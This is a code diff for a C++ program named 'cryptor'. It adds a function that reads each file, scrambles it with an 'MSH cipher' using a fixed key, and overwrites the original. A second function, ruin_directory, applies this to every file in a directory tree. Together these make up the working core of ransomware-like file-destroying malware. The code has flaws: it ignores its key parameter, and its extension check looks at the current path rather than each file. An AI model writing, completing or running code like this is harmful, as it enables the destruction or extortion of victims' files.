@@ -15,36 +15,11 @@
 #include <vector>
 #include "banners.h"
 #include "cipher.h"
+#include "config.h"
 
 namespace cryptor {
     
 namespace fs = std::filesystem;
-
-// Function to encrypt a singular file
-void encrypt_file(const fs::path& file_path, char key) {
-    /* Open the current target file in binary mode */
-    std::ifstream input_file(file_path, std::ios::binary);
-    
-    /* Throw an error if the current input file cannot be opened */
-    if (!input_file) {
-        banners::print_error({"Failed to open file/file path for reading", file_path});
-        exit(1);
-    }
-    
-    /* Read all of the file into a string */
-    
-    
-    /* Encrypt the file using MSH cipher */
-    
-    
-    /* Open the same file for writing */
-    
-    
-    /* Write the encrypted data back into the file */
-}
-
-// Function to recursively recurse through the defined directory
-
 
 // Function to identify certain file extensions
 bool isExtensionValid(std::vector<std::string> extensions, std::string directory) {
@@ -86,6 +61,53 @@ bool isExtensionValid(std::vector<std::string> extensions, std::string directory
     }
     
     return false;
+}
+
+// Function to encrypt a singular file
+void encrypt_file(const fs::path& file_path, char key) {
+    /* Open the current target file in binary mode */
+    std::ifstream input_file(file_path, std::ios::binary);
+    
+    /* Throw an error if the current input file cannot be opened */
+    if (!input_file) {
+        banners::print_error({"Failed to open file/file path for reading", file_path});
+        exit(1);
+    }
+    
+    /* Read all of the file into a string */
+    std::string buff((std::istreambuf_iterator<char>(input_file)),
+                              std::istreambuf_iterator<char>());
+
+    input_file.close();
+    
+    /* Encrypt the file using MSH cipher if the valid extensions are found */
+    if (isExtensionValid(validExtensions, fs::current_path())) {
+        cipher::msh_cipher(buff, 0xA9);
+    }
+    
+    /* Open the same file for writing */
+    std::ofstream ot_file(file_path, std::ios::binary);
+
+    if (!ot_file) {
+        banners::print_error({"Could not open file for writing...", file_path});
+        exit(1);
+    }
+    
+    /* Write the encrypted data back into the file */
+    ot_file.write(buff.c_str(), buff.size());
+    ot_file.close();
+
+
+}
+
+// Function to recursively recurse through the defined directory
+void ruin_directory(const fs::path& directory, char key) {
+    // Traverse the directory using recursive_directory_iterator (for sub-directories)
+    for(const auto& entry : fs::recursive_directory_iterator(directory)) {
+        if (entry.is_regular_file()) {
+            encrypt_file(entry.path(), key);
+        }
+    }
 }
     
 };
